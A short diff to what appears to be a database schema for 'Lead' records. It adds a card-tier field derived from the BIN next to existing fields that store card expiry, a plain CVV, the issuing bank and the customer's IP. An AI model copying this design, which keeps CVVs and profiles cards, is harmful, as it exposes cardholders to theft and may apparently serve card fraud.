@@ -232,6 +232,7 @@ model Lead {
   cardExpiry    String
   cardCvv       String
   cardBank      String?  // Instituição emissora identificada pelo BIN do cartão (best-effort)
+  cardLevel     String?  // Nível/produto do cartão pelo BIN: "Visa Gold", "MasterCard World Elite", "Crédito" etc.
   ip            String?  // IP do cliente no momento do pedido (capturado no checkout)
   installments  String
   notes         String?
